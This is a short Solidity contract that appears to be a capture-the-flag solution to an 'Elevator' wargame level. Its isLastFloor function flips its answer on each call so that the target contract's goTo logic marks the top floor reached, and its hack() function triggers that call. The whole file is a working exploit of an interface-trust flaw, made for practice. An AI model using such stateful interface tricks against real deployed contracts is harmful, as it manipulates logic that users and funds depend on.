// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
   function goTo(uint _floor) external;
}

contract Building {
  address elevatorContractAddress;
  bool isLast = false;

  constructor(address _elevatorContractAddress) {
    elevatorContractAddress = _elevatorContractAddress;
  }

   function isLastFloor(uint floor) external returns (bool) {
    isLast = !isLast;
    return isLast;
  }

  function hack(uint floor) public {
    Elevator(elevatorContractAddress).goTo(floor);
  }

}
